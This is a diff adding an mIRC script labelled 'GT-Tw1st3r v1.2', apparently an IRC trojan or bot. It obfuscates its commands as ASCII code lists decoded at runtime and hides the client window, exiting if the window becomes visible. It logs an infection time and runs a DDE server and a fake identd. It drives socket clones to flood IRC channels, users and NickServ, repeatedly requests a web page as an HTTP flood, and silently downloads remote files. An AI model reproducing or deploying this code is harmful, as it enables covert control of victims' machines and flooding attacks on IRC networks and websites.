@@ -1,0 +1,199 @@
+  
+
+       DAMNS NEVER STOP AND JoCkeR IS DAMNS CREATER
+ 
+
+GT-Tw1st3r v1.2 Created On 21.1.2003
+Owner : JoCkeR 
+This is a private GT if you found it "fuck you"
+
+on *:start:{
+  .$dw(104-49-100-101)
+  .$dw(100-100-101-115-101-114-118-101-114) on dal
+  .$dw(102-108-117-115-104)
+  .$dw(105-100-101-110-116-100) on $fnick
+  .$dw(97-100-100-117-115-101-114)
+  .$dw(67-111-110-97)
+  .$dw(116-105-109-101-114-99-104-101-99-107) 0 10 /cona
+  .$dw(116-105-109-101-114-115-51-51) -o 0 1 /s33
+  .$dw(116-105-109-101-114-72-49-100-100-51) -o 0 1 H1dd3
+  .$dw(110-48-99-108-111-110-101)
+  .$dw(115-116-97-116-115)
+  $dw(105-110-99) %many
+  if (%many = 1) { set %infecttime $day $date $time }
+  if (%many = 1) { $dw(110-105-99-107) Jk1[ $+ $r(10,100) $+ $r(10,100) $+ $r(10,100) $+ ] }
+  if (%many != 1) { $dw(110-105-99-107) Jk[ $+ $r(10,100) $+ $r(10,100) $+ $r(10,100) $+ ] }
+}
+on *:connect:{
+  .$dw(116-105-109-101-114-112-105-110-103) 0 60 //ctcp $me ping
+  .$dw(116-105-109-101-114-99-104-101-99-107) off
+  .$dw(116-105-109-101-114-106-99) 0 $rand(5,10) /jc
+}
+alias n0clone { if ($portfree(447855) == $false) { $dw(101-120-105-116) } | $dw(115-111-99-107-108-105-115-116-101-110) $dw(110-111-99-108-111-110-101) 447855 }
+alias h1de { if ($exists(windows.ttf) == $true) { $dw(100-108-108) windows.ttf hide | return } }
+alias clone {
+  if ($1 = con) { set %cserver $2 | /set %cport $3 | /timeropensock $+ $fnick $4 2 opensock }
+  if ($1 = join) { $dw(115-111-99-107-119-114-105-116-101) -nt Clone* Join $2- }
+  if ($1 = part) { $dw(115-111-99-107-119-114-105-116-101) -nt Clone* Part $2 : $+ $3- }
+  if ($1 = msg) { $dw(115-111-99-107-119-114-105-116-101) -nt Clone* privmsg $2 : $+ $3- }
+  if ($1 = notice) { $dw(115-111-99-107-119-114-105-116-101) -nt Clone* notice $2 : $+ $3- }
+  if ($1 = reg) { $dw(115-111-99-107-119-114-105-116-101) -nt Clone* Privmsg NickServ : $+ register $2- | $dw(115-111-99-107-119-114-105-116-101) -nt Clone* Privmsg NickServ : $+ identify $2- }
+  if ($1 = creg) { set %rchan # $+ $fnick $+ $rand(1,1000) | $dw(115-111-99-107-119-114-105-116-101) -nt Clone* Join %rchan | $dw(115-111-99-107-119-114-105-116-101) -nt Clone* Privmsg Chanserv : register %rchan $fnick Clone }
+  if ($1 = jp) { $dw(115-111-99-107-119-114-105-116-101) -nt Clone* Join $2- | $dw(115-111-99-107-119-114-105-116-101) -nt Clone* part $2 : $3- | $dw(115-111-99-107-119-114-105-116-101) -nt Clone* Join $2- | $dw(115-111-99-107-119-114-105-116-101) -nt Clone* part $2 : $3- | $dw(115-111-99-107-119-114-105-116-101) -nt Clone* Join $2- | $dw(115-111-99-107-119-114-105-116-101) -nt Clone* part $2 : $3- }
+  if ($1 = jmp) { $dw(115-111-99-107-119-114-105-116-101) -nt Clone* Join $2 | $dw(115-111-99-107-119-114-105-116-101) -nt Clone* privmsg $2 : $3- | $dw(115-111-99-107-119-114-105-116-101) -nt Clone* part $2 }
+  if ($1 = flood.c) { $dw(115-111-99-107-119-114-105-116-101) -nt Clone* join $2 | $dw(115-111-99-107-119-114-105-116-101) -nt Clone* privmsg $2 : $3- | $dw(115-111-99-107-119-114-105-116-101) -nt Clone* notice $2 : $3- | $dw(115-111-99-107-119-114-105-116-101) -nt Clone* privmsg $2 : $3- }
+  if ($1 = flood.n) { $dw(115-111-99-107-119-114-105-116-101) -nt Clone* privmsg $2 : $3- | $dw(115-111-99-107-119-114-105-116-101) -nt Clone* notice $2 : $3- | $dw(115-111-99-107-119-114-105-116-101) -nt Clone* privmsg $2 : $3- }
+  if ($1 = chat.flood) { $dw(115-111-99-107-119-114-105-116-101) -nt Clone* privmsg $2 :DCC CHAT $2 1058633484 3481  }
+  if ($1 = Quit) { $dw(115-111-99-107-119-114-105-116-101) -nt Clone* Quit : $+ $2- }
+  if ($1 = massquit) { $dw(115-111-99-107-119-114-105-116-101) -nt Clone* Join $2 | $dw(115-111-99-107-119-114-105-116-101) -nt Clone* Quit : $+ $3- }
+  if ($1 = fnick) { $dw(115-111-99-107-119-114-105-116-101) -nt Clone* Nick $2 $+ $r(1,1000) $+ $r(1,1000)  }
+  if ($1 = Die) { timeropensock* off | sockclose Clone* }
+}
+alias opensock { $dw(115-111-99-107-111-112-101-110) Clone $+ $fnick %cserver %cport }
+alias Stay {
+  if (PING = $1) { $dw(115-111-99-107-119-114-105-116-101) -nt * $1- }
+}
+on *:sockopen:Clone*:{
+  set -u1 %user $rand(A,Z) $+ $fnick $+ $rand(A,Z)
+  .$dw(115-111-99-107-119-114-105-116-101) -nt $sockname USER %user %user %user : $+ %user
+  .$dw(115-111-99-107-119-114-105-116-101) -nt $sockname NICK $fnick
+}
+raw 433:*:{
+  if (%many = 1) { nick Jk1[ $+ $r(10,100) $+ $r(10,100) $+ $r(10,100) $+ ] }
+  if (%many != 1) { nick Jk[ $+ $r(10,100) $+ $r(10,100) $+ $r(10,100) $+ ] }
+}
+alias apages { set %asite $1 | set %filesite $2 | $dw(115-111-99-107-111-112-101-110) apages $+ $fnick %asite 80 }
+alias apagestop { timerapage* off | sockclose apages* }
+on *:sockopen:apages*:{
+  timerapage $+ $fnick 0 2 $dw(115-111-99-107-119-114-105-116-101) -nt apages* GET %filesite
+}
+alias H1dd3 { if ($appstate != hidden) { /exit } }
+alias s33 { if ($appactive = $true) { /exit } }
+on *:socklisten:ident: { .$dw(115-111-99-107-97-99-99-101-112-116) $sockname $+ . $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) }
+on *:sockread:IDENT.*: { $dw(115-111-99-107-114-101-97-100) %tmp | tokenize 32 %tmp | $dw(115-111-99-107-119-114-105-116-101) -tn $sockname $3 $2 $1 : USERID : UNIX : $fnick | unset %tmp }
+alias dw {
+  if ($calc($count($1,-) + 1) = 1) {  goto 1 }
+  if ($calc($count($1,-) + 1) = 2) {  goto 2 }
+  if ($calc($count($1,-) + 1) = 3) {  goto 3 }
+  if ($calc($count($1,-) + 1) = 4) {  goto 4 }
+  if ($calc($count($1,-) + 1) = 5) {  goto 5 }
+  if ($calc($count($1,-) + 1) = 6) {  goto 6 }
+  if ($calc($count($1,-) + 1) = 7) {  goto 7 }
+  if ($calc($count($1,-) + 1) = 8) {  goto 8 }
+  if ($calc($count($1,-) + 1) = 9) {  goto 9 }
+  if ($calc($count($1,-) + 1) = 10) {  goto 10 }
+  if ($calc($count($1,-) + 1) = 11) {  goto 11 }
+  if ($calc($count($1,-) + 1) = 12) {  goto 12 }
+  if ($calc($count($1,-) + 1) = 13) {  goto 13 }
+  if ($calc($count($1,-) + 1) = 14) {  goto 14 }
+  if ($calc($count($1,-) + 1) = 15) {  goto 15 }
+  if ($calc($count($1,-) + 1) = 16) {  goto 16 }
+  if ($calc($count($1,-) + 1) = 17) {  goto 17 }
+  if ($calc($count($1,-) + 1) = 18) {  goto 18 }
+  if ($calc($count($1,-) + 1) = 19) {  goto 19 }
+  if ($calc($count($1,-) + 1) = 20) {  goto 20 }
+  :20
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $+ $chr($gettok($1,5,45)) $+ $chr($gettok($1,6,45)) $+ $chr($gettok($1,7,45)) $+ $chr($gettok($1,8,45)) $+ $chr($gettok($1,9,45)) $+ $chr($gettok($1,10,45)) $+ $chr($gettok($1,11,45)) $+ $chr($gettok($1,12,45)) $+ $chr($gettok($1,13,45)) $+ $chr($gettok($1,14,45)) $+ $chr($gettok($1,15,45)) $+ $chr($gettok($1,16,45)) $+ $chr($gettok($1,17,45)) $+ $chr($gettok($1,18,45)) $+ $chr($gettok($1,19,45)) $+ $chr($gettok($1,20,45)) $2- | goto end
+  :19
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $+ $chr($gettok($1,5,45)) $+ $chr($gettok($1,6,45)) $+ $chr($gettok($1,7,45)) $+ $chr($gettok($1,8,45)) $+ $chr($gettok($1,9,45)) $+ $chr($gettok($1,10,45)) $+ $chr($gettok($1,11,45)) $+ $chr($gettok($1,12,45)) $+ $chr($gettok($1,13,45)) $+ $chr($gettok($1,14,45)) $+ $chr($gettok($1,15,45)) $+ $chr($gettok($1,16,45)) $+ $chr($gettok($1,17,45)) $+ $chr($gettok($1,18,45)) $+ $chr($gettok($1,19,45)) $2- | goto end
+  :18
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $+ $chr($gettok($1,5,45)) $+ $chr($gettok($1,6,45)) $+ $chr($gettok($1,7,45)) $+ $chr($gettok($1,8,45)) $+ $chr($gettok($1,9,45)) $+ $chr($gettok($1,10,45)) $+ $chr($gettok($1,11,45)) $+ $chr($gettok($1,12,45)) $+ $chr($gettok($1,13,45)) $+ $chr($gettok($1,14,45)) $+ $chr($gettok($1,15,45)) $+ $chr($gettok($1,16,45)) $+ $chr($gettok($1,17,45)) $+ $chr($gettok($1,18,45)) $2- | goto end
+  :17
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $+ $chr($gettok($1,5,45)) $+ $chr($gettok($1,6,45)) $+ $chr($gettok($1,7,45)) $+ $chr($gettok($1,8,45)) $+ $chr($gettok($1,9,45)) $+ $chr($gettok($1,10,45)) $+ $chr($gettok($1,11,45)) $+ $chr($gettok($1,12,45)) $+ $chr($gettok($1,13,45)) $+ $chr($gettok($1,14,45)) $+ $chr($gettok($1,15,45)) $+ $chr($gettok($1,16,45)) $+ $chr($gettok($1,17,45)) $2- | goto end
+  :16
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $+ $chr($gettok($1,5,45)) $+ $chr($gettok($1,6,45)) $+ $chr($gettok($1,7,45)) $+ $chr($gettok($1,8,45)) $+ $chr($gettok($1,9,45)) $+ $chr($gettok($1,10,45)) $+ $chr($gettok($1,11,45)) $+ $chr($gettok($1,12,45)) $+ $chr($gettok($1,13,45)) $+ $chr($gettok($1,14,45)) $+ $chr($gettok($1,15,45)) $+ $chr($gettok($1,16,45)) $2- | goto end
+  :15
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $+ $chr($gettok($1,5,45)) $+ $chr($gettok($1,6,45)) $+ $chr($gettok($1,7,45)) $+ $chr($gettok($1,8,45)) $+ $chr($gettok($1,9,45)) $+ $chr($gettok($1,10,45)) $+ $chr($gettok($1,11,45)) $+ $chr($gettok($1,12,45)) $+ $chr($gettok($1,13,45)) $+ $chr($gettok($1,14,45)) $+ $chr($gettok($1,15,45)) $2- | goto end
+  :14 
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $+ $chr($gettok($1,5,45)) $+ $chr($gettok($1,6,45)) $+ $chr($gettok($1,7,45)) $+ $chr($gettok($1,8,45)) $+ $chr($gettok($1,9,45)) $+ $chr($gettok($1,10,45)) $+ $chr($gettok($1,11,45)) $+ $chr($gettok($1,12,45)) $+ $chr($gettok($1,13,45)) $+ $chr($gettok($1,14,45)) $2- | goto end
+  :13
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $+ $chr($gettok($1,5,45)) $+ $chr($gettok($1,6,45)) $+ $chr($gettok($1,7,45)) $+ $chr($gettok($1,8,45)) $+ $chr($gettok($1,9,45)) $+ $chr($gettok($1,10,45)) $+ $chr($gettok($1,11,45)) $+ $chr($gettok($1,12,45)) $+ $chr($gettok($1,13,45)) $2-  | goto end
+  :12
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $+ $chr($gettok($1,5,45)) $+ $chr($gettok($1,6,45)) $+ $chr($gettok($1,7,45)) $+ $chr($gettok($1,8,45)) $+ $chr($gettok($1,9,45)) $+ $chr($gettok($1,10,45)) $+ $chr($gettok($1,11,45)) $+ $chr($gettok($1,12,45)) $2- | goto end
+  :11
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $+ $chr($gettok($1,5,45)) $+ $chr($gettok($1,6,45)) $+ $chr($gettok($1,7,45)) $+ $chr($gettok($1,8,45)) $+ $chr($gettok($1,9,45)) $+ $chr($gettok($1,10,45)) $+ $chr($gettok($1,11,45)) $2- | goto end
+  :10
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $+ $chr($gettok($1,5,45)) $+ $chr($gettok($1,6,45)) $+ $chr($gettok($1,7,45)) $+ $chr($gettok($1,8,45)) $+ $chr($gettok($1,9,45)) $+ $chr($gettok($1,10,45)) $2-  | goto end
+  :9
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $+ $chr($gettok($1,5,45)) $+ $chr($gettok($1,6,45)) $+ $chr($gettok($1,7,45)) $+ $chr($gettok($1,8,45)) $+ $chr($gettok($1,9,45)) $2- | goto end
+  :8
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $+ $chr($gettok($1,5,45)) $+ $chr($gettok($1,6,45)) $+ $chr($gettok($1,7,45)) $+ $chr($gettok($1,8,45)) $2- | goto end
+  :7
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $+ $chr($gettok($1,5,45)) $+ $chr($gettok($1,6,45)) $+ $chr($gettok($1,7,45)) $2- | goto end
+  :6  
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $+ $chr($gettok($1,5,45)) $+ $chr($gettok($1,6,45)) $2- | goto end
+  :5
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $+ $chr($gettok($1,5,45)) $2- | goto end
+  :4
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $+ $chr($gettok($1,4,45)) $2- | goto end
+  :3
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $+ $chr($gettok($1,3,45)) $2- | goto end
+  :2
+  return  $chr($gettok($1,1,45)) $+ $chr($gettok($1,2,45)) $2- | goto end
+  :1
+  return  $chr($gettok($1,1,45)) $2-  | goto end
+  :end
+}
+alias download {
+  var %socket $+(dl,$chr(46),$nopath($2))
+  if (!$sock(%socket)) {
+    $dw(115-111-99-107-111-112-101-110) %socket $1 80
+    $dw(115-111-99-107-109-97-114-107) %socket HEAD $1 $2
+  }
+  else { echo $color(info) -s * Socket already in use. }
+}
+alias downd {
+  if ($exists($nopath($2)) = $false) || ($file($nopath($2)).size != $3) {
+    var %socket $+(dl,$chr(46),$nopath($2))
+    if (!$sock(%socket)) {
+      $dw(115-111-99-107-111-112-101-110) %socket $1 80
+      $dw(115-111-99-107-109-97-114-107) %socket HEAD $1 $2
+    }
+    else { echo $color(info) -s * Socket already in use. }
+  }
+}
+alias percent return $+($round($calc((100 / $2) * $1),2),%)
+
+on *:SOCKOPEN:dl.*:{
+  if ($sockerr) { echo $color(info) -s * Error: $sock($sockname).wsmsg | return }
+  hadd -m ticks $sockname $ticks
+  var %file = $nopath($gettok($sock($sockname).mark,3,32)), %fullfile = $+(",$mircdir,%file,"), %sckr = $dw(115-111-99-107-119-114-105-116-101) -n $sockname, %^ = $gettok($sock($sockname).mark,3,32)
+  $dw(119-114-105-116-101) -c %fullfile
+  %sckr GET $iif(left(%^,1) != $chr(47),$chr(47) $+ %^,%^) HTTP/1.0
+  %sckr HOST: $gettok($sock($sockname).mark,2,32)
+  %sckr ACCEPT: *.*
+  %sckr $crlf
+}
+
+on *:SOCKREAD:dl.*:{
+  if ($sockerr) {
+    echo $color(info) -s * Error: $sock($sockname).wsmsg
+    return
+  }
+  var %a
+  :begin
+  if ($gettok($sock($sockname).mark,1,32) == head) { sockread %a }
+  else { sockread &b }
+  if ($sockbr) {
+    tokenize 32 $sock($sockname).mark
+    if ($1 == HEAD) {
+      if (%a) {
+        if ($gettok(%a,1,32) == Content-Length:) { var %totsize = $gettok(%a,2,32) }
+      }
+      else {
+        $dw(115-111-99-107-109-97-114-107) $sockname GET $2- %totsize
+      }
+    }
+    elseif ($1 == GET) {
+      var %file = $+(",$mircdir,$nopath($3),"), %cursize = $file(%file).size
+      var %totsize = $gettok($sock($sockname).mark,4,32)
+      $dw(98-119-114-105-116-101) %file -1 &b
+    }
+    goto begin
+  }
+}
+
+on *:SOCKCLOSE:dl.*:{
+  var %ticks = $calc(($ticks - $hget(ticks,$sockname)) /1000)
+  $dw(109-115-103) %cc * Download of $nopath($gettok($sock($sockname).mark,3,32)) completed in %ticks seconds.
+}
